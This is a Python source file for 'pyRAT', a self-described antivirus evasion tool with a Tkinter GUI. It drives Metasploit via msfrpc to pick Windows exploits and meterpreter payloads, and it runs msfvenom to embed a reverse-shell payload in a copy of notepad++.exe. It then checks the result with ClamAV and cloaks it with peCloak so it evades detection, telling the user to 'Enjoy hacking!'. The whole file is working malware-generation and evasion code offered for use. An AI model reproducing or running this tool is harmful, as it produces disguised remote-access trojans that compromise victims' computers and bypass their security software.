"""
This file is part of pyRAT, an antivirus evasion tool, written in python (https://github.com/nikosthem/pyRAT/) created by 
Themelis Nikolaos (@nikosthem).
For more info about pyRAT see the 'README.md' file.
"""

import subprocess, sys, os, pyclamd, peCloak
from Tkinter import *
from tkMessageBox import askquestion, showerror
import tkMessageBox
from Crypto import Random
from Crypto.Cipher import AES
from PIL import Image, ImageTk



def color(text, color_code):
    if sys.platform == "win32" and os.getenv("TERM") != "xterm":
        return text
 
    return '\x1b[%dm%s\x1b[0m' % (color_code, text)
 
def red(text):
    return color(text, 31)
 
def blink(text):
    return color(text, 05)
    
def green(text):
    return color(text, 32)
 

def raise_frame(frame):
    frame.tkraise()

# Remove buttons after use
def rm(thing):
       thing.place_forget()

# Canvas Size
def myfunction(event):
		    for c in (canvas, canvas1):
			c.configure(scrollregion=c.bbox("all"),width=530,height=400)

		    canvas0.configure(scrollregion=canvas0.bbox("all"),width=28,height=400)   
		    canvas2.configure(scrollregion=canvas2.bbox("all"),width=540,height=193)
		    canvas3.configure(scrollregion=canvas3.bbox("all"),width=540,height=400)
		    canvas4.configure(scrollregion=canvas4.bbox("all"),width=540,height=400)

# Show Windows Exploits
def showExploits(): 
                global exploit
                for i in (mod.get('modules')): 
                    if "windows" in i:
		        Radiobutton(frame, text=str(i), variable=var, value=i).pack(anchor=W)
                        
                gbutton = Button(root, text="Show Compatible Payloads", bg='lightblue', state=ACTIVE, command=lambda: [showPayloads(),rm(gbutton)])
	        gbutton.place(relx=0.5, rely=0.96,anchor=CENTER)
                           

    
# Show Compatible Payloads(only meterpreter)
def showPayloads():
    global fbutton
    raise_frame(f2)
    exploit = var.get()
    index_value = mod['modules'].index(exploit) 
    ret = client.call('module.compatible_payloads',[mod['modules'][index_value]])

    for i in (ret.get('payloads')):
        if "/meterpreter" in i:
           Radiobutton(frame1, text=str(i), variable=var, value=i).pack(anchor=W)
    fbutton = Button(root, text="Choose Payload", bg='lightblue', state=ACTIVE, command=lambda: mal(var))
    fbutton.place(x=420, y=525)
  
# Set Payload Options
def mal(var):
    
    global payload, ip, top, porta , out, opt
    rm(fbutton)
    payload = var.get()
    raise_frame(f3)
    top=Toplevel()
    top.title('pyRAT')
    top.resizable(width=False, height=False)
    top.geometry("+480+260")
    Label(top, text='Please, insert your local IP address:').pack()
    ip = Entry(top,width=30, bg="lightblue")
    ip.pack()
    Label(top, text='Please, insert your local port:').pack()
    porta = Entry(top,width=30, bg="lightblue")
    porta.pack()
    t = StringVar(top, value="''")
    Label(top, text='Please, insert other options if required:').pack()
    opt = Entry(top,textvariable=t,width=30, bg="lightblue")
    opt.pack()
    v = StringVar(top, value='payloads/')
    Label(top, text="Please, insert the file's name: ").pack()
    out = Entry(top,textvariable=v, width=30, bg="lightblue")
    out.pack()

    information = Button(top, text="i", bg='lightblue', state=ACTIVE, command=lambda: [info()])
    information.pack(side=RIGHT)
    btn = Button(top, text="Generate Payload", bg='lightblue', state=ACTIVE, command=lambda: [validation(), cleanup(), gen_msg()])
    btn.pack()

def info():
    
    tkMessageBox.showinfo("Info for the extra options", "e.g: 'RHOST=192.168.X.X RPORT=445' or leave it blank ")
def gen_msg():

    tkMessageBox.showinfo("DONE!", "Sorry for keep you waiting. The payload is now ready! ")



# Check IP's validity
def ipFormatChk(lhost):
    if len(lhost.split()) == 1:
        ipList = lhost.split('.')
        if len(ipList) == 4:
            for i, item in enumerate(ipList):
                try:
                    ipList[i] = int(item)
                except:
                    tkMessageBox.showerror("Error", "Invalid IP Address")
                    return False
                    
                if not isinstance(ipList[i], int):
                    tkMessageBox.showerror("Error", "Invalid IP Address")
                    return False
            if max(ipList) < 256:
                return True
            else:
                tkMessageBox.showerror("Error", "Invalid IP Address")
        else:
            tkMessageBox.showerror("Error", "Invalid IP Address")
            return False
    else:
        tkMessageBox.showerror("Error", "Invalid IP Address")
        return False

# Check IP's validity
def validation():
    global lhost
    lhost = ip.get()
    
    while True:
      #If LHOST is valid, proceed with the generation of the payload
      if ipFormatChk(lhost) == True:
         generation()
         break
      else:
         tkMessageBox.destroy()

# Generate payload              
def generation():
    global scan, lport, file_name, options, name, legit_file
    lport = porta.get()
    options = opt.get()
    name = out.get()
    file_name = name + ".exe"

############################################################################################################
# User has to know in advance the required options in order for the payload to be executed successfully :) #
############################################################################################################

# This can be done by opening metasploit and seeing the options
# e.g --> use windows/smb/ms17_010_psexec,
#         set payload windows/meterpreter/reverse_tcp
#         show options
 
    generate_payload = subprocess.Popen(['msfvenom', '-p', payload, lhost, lport, options, '-f', 'exe', '-x', legit_file, '-o', file_name], stdout=subprocess.PIPE).communicate()[0]
    yolo = Label(f3, text='Press the "Scan file for virus" button. It will begin the scanning with ClamAV.')
    yolo.place(x=2,y=5)
    scan = Button(root,text="Scan file for virus", bg='lightblue', state=ACTIVE, command=lambda: [clamscan(),rm(scan), raise_frame(f4)])
    scan.place(relx=0.5, rely=0.96,anchor=CENTER)   
   
def cleanup():
       top.destroy()
    
def clamscan():

    tkMessageBox.showinfo("Loading...", "An attacker has to be patient...Wait for a few seconds after pressing the button in order for the scanning to be completed!")
    check()
    
# Show success message after hiding
def success():
          tkMessageBox.showinfo("Final Check...","Wait and see the ClamAV's results... ")
          final()


def check():
          # Check with pyclamd if file is infected
          daemon = pyclamd.ClamdUnixSocket()
          cwd = os.getcwd()
          virus_name = cwd + "/" + file_name
          results = daemon.scan_file(virus_name)    
          
          if results:   
                raise_frame(f4)
                rm(scan)
                process = subprocess.Popen(['clamscan', file_name], stdout=subprocess.PIPE)
                stdout = process.communicate()[0]
                Label(f4,text='Payload scanned:  {}'.format(stdout)).place(x=2,y=5)
                
                tkMessageBox.showinfo("File infected!!!", "MALWARE : %s" % results)               
    	        Label(f4, text="Now we have to hide the payload in order to bypass the AVs!").place(x=2,y=240)
                enc = Button(root,text="Hide Payload", bg='lightblue', state=ACTIVE, command=lambda:[peCloak(),rm(enc)])
                enc.place(relx=0.5, rely=0.96,anchor=CENTER)
                
          else:
                tkMessageBox.showinfo("Awesome!!!","File is clean. Wait and see the ClamAV's results... ")
		raise_frame(f4)
                process = subprocess.Popen(['clamscan', file_name], stdout=subprocess.PIPE)
                stdout = process.communicate()[0]
                Label(f4,text='Payload scanned: {}'.format(stdout)).place(x=2,y=5)
                Label(f4, text="The payload is now ready for the attack. Enjoy hacking!").place(x=2,y=240)
          
                adios = Button(root,text="Quit", bg='lightblue', state=ACTIVE, command=quit)
                adios.place(relx=0.5, rely=0.96,anchor=CENTER)


    
def peCloak():
          subprocess.Popen("python peCloak.py " + file_name, shell=True).wait()
          success()

def final():          
          fname = name + "_pyRAT.exe"
          raise_frame(f5)
          process = subprocess.Popen(['clamscan', fname], stdout=subprocess.PIPE)
          stdout = process.communicate()[0]
          Label(f5,text='Payload scanned: {}'.format(stdout)).place(x=2,y=5)
          Label(f5, text="The payload is now ready for the attack. Enjoy hacking!").place(x=2,y=240)
          
          adios = Button(root,text="Quit", bg='lightblue', state=ACTIVE, command=quit)
          adios.place(relx=0.5, rely=0.96,anchor=CENTER)

###############################
# Main program starts here :) #
###############################

if __name__ == "__main__":
	
	
	try:
           import msfrpc
        except:
           sys.exit(red(blink("Install the msfrpc library that can be found here: https://github.com/SpiderLabs/msfrpc.git")))
  
	root=Tk()
	root.title("pyRAT")
	root.geometry("560x560+320+120")
        root.resizable(width=False, height=False)
        root.configure(bg='lightblue')
        var = StringVar()
	heading = Label(root, text="\npyRAT: The AV Evader!", font=("arial", 20), bg='lightblue').pack()
        label = Label(root, textvariable=var, font=("arial", 12),bg='lightblue').pack()
	var.set("Just wait for it...")
        legit_file = 'notepad++.exe'


        f = Frame(root,relief=GROOVE,width=80,height=100,bd=8)
	f.place(x=1,y=100)
        photo = PhotoImage(file="img/raticate.png")
        rat = Label(f,image=photo)
        rat.pack(side = "left",fill = "both", expand = "yes")
        photo1 = PhotoImage(file="img/Raticate_(Alola).png")
        rat1 = Label(f,image=photo1)
        rat1.pack(side = "right",fill = "both", expand = "yes")
        canvas0=Canvas(f)
	frame0=Frame(canvas0)
	canvas0.pack(side="left")
	canvas0.create_window((1,1),window=frame0,anchor='nw')
	frame0.bind("<Configure>",myfunction)

         
	f1 = Frame(root,relief=GROOVE,width=50,height=100,bd=8)
        f1.place(x=1,y=100)
        canvas=Canvas(f1)
	frame=Frame(canvas)
	myscrollbar=Scrollbar(f1,orient="vertical",command=canvas.yview,bg='lightblue')
	canvas.configure(yscrollcommand=myscrollbar.set)
	myscrollbar.pack(side="right",fill="y")
	canvas.pack(side="left")
	canvas.create_window((1,1),window=frame,anchor='nw')
	frame.bind("<Configure>",myfunction)

   
	f2 = Frame(root,relief=GROOVE,width=50,height=100,bd=8)
	f2.place(x=1,y=100)
        canvas1=Canvas(f2)
	frame1=Frame(canvas1)
	myscrollbar1=Scrollbar(f2,orient="vertical",command=canvas1.yview,bg='lightblue')
	canvas1.configure(yscrollcommand=myscrollbar1.set)
	myscrollbar1.pack(side="right",fill="y")
	canvas1.pack(side="left")
	canvas1.create_window((1,1),window=frame1,anchor='nw')
	frame1.bind("<Configure>",myfunction)


	f3 = Frame(root,relief=GROOVE,width=80,height=100,bd=8)
	f3.place(x=1,y=100)
        photo3 = PhotoImage(file="img/rat.png")
        rat3 = Label(f3,image=photo3)
        rat3.pack(side = "bottom")
        canvas2=Canvas(f3)
	frame2=Frame(canvas2)
	canvas2.pack(side="left")
	canvas2.create_window((1,1),window=frame2,anchor='nw')
	frame2.bind("<Configure>",myfunction)


        f4 = Frame(root,relief=GROOVE,width=80,height=100,bd=8)
	f4.place(x=1,y=100)
        canvas3=Canvas(f4)
	frame3=Frame(canvas3)
	canvas3.pack(side="left")
	canvas3.create_window((1,1),window=frame3,anchor='nw')
	frame3.bind("<Configure>",myfunction)
   

        f5 = Frame(root,relief=GROOVE,width=80,height=100,bd=8)
	f5.place(x=1,y=100)
        canvas4=Canvas(f5)
	frame4=Frame(canvas4)
	canvas4.pack(side="left")
	canvas4.create_window((1,1),window=frame4,anchor='nw')
	frame4.bind("<Configure>",myfunction)

#######################################################
# Run a "sudo freshclam" to update the AV database :) #
#######################################################

	try: 
	# Create a new instance of the Msfrpc client with the default options
	   client = msfrpc.Msfrpc({})
           #subprocess.Popen("sudo freshclam", shell=True).wait()
           subprocess.Popen("service clamav-daemon restart", shell=True).wait()
	# Login to the msfmsg server using the password "abc123"
	   client.login('msf','abc123')
	   print(green(blink("Connection to msfrpc successful!")))
	# Get a list of the exploits from the server and print the windows' ones
	   mod = client.call('module.exploits')
	except:
	   sys.exit(red(blink("Connection Failed. Please run << msfrpcd -U msf -P abc123 -f -S -a 127.0.0.1 >> in another terminal"))) 
        
        

        
	raise_frame(f)
        mbutton = Button(root, text="Show Exploits", bg='lightblue', state=ACTIVE, command=lambda: [showExploits(), rm(mbutton),raise_frame(f1)])
        mbutton.place(x=20, y=525)
	root.mainloop()
